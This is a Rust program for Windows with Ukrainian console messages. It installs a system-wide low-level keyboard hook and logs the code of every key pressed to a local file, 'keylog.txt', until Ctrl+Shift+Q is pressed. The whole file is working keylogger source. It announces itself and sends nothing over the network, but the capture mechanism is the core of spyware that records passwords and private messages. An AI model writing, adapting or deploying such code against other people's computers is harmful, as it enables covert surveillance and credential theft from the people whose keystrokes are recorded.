use std::fs::OpenOptions;
use std::io::Write;
use std::sync::{Mutex, OnceLock};
use windows::core::Result;
use windows::Win32::Foundation::{LPARAM, LRESULT, WPARAM};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, KBDLLHOOKSTRUCT, VK_CONTROL, VK_SHIFT,
};
use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, DispatchMessageW, GetMessageW, PostQuitMessage, SetWindowsHookExW,
    TranslateMessage, UnhookWindowsHookEx, HHOOK, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
};

static LOG_FILE: OnceLock<Mutex<std::fs::File>> = OnceLock::new();
static HOOK_HANDLE: OnceLock<HHOOK> = OnceLock::new();

unsafe extern "system" fn hook_callback(ncode: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if ncode >= 0 {
        if wparam.0 as u32 == WM_KEYDOWN || wparam.0 as u32 == WM_SYSKEYDOWN {
            let kbd_struct = *(lparam.0 as *const KBDLLHOOKSTRUCT);
            let vk_code = kbd_struct.vkCode;

            if let Some(mutex) = LOG_FILE.get() {
                if let Ok(mut file) = mutex.lock() {

                    let _ = writeln!(file, "Натиснуто клавішу: VK_CODE {}", vk_code);
                }
            }

            let ctrl_pressed = (GetAsyncKeyState(VK_CONTROL.0 as i32) as u16 & 0x8000) != 0;
            let shift_pressed = (GetAsyncKeyState(VK_SHIFT.0 as i32) as u16 & 0x8000) != 0;
            let q_pressed = vk_code == 0x51;

            if ctrl_pressed && shift_pressed && q_pressed {
                println!("Отримано сигнал на завершення (Ctrl+Shift+Q)...");
                PostQuitMessage(0);
            }
        }
    }
    
    CallNextHookEx(None, ncode, wparam, lparam)
}

fn main() -> Result<()> {
    let file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .expect("Не вдалося відкрити файл для логування");
        
    LOG_FILE.set(Mutex::new(file)).unwrap();

    unsafe {
        let hook = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            None,
            0,
        )?;
        HOOK_HANDLE.set(hook).unwrap();

        println!("Перехоплювач клавіш успішно запущено.");
        println!("Усі натискання записуються у файл 'keylog.txt'.");
        println!("Щоб безпечно завершити програму, натисніть: Ctrl + Shift + Q");

        let mut msg = MSG::default();
        while GetMessageW(&mut msg, None, 0, 0).into() {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        UnhookWindowsHookEx(hook)?;
    }
    
    println!("Програму успішно завершено.");
    Ok(())
}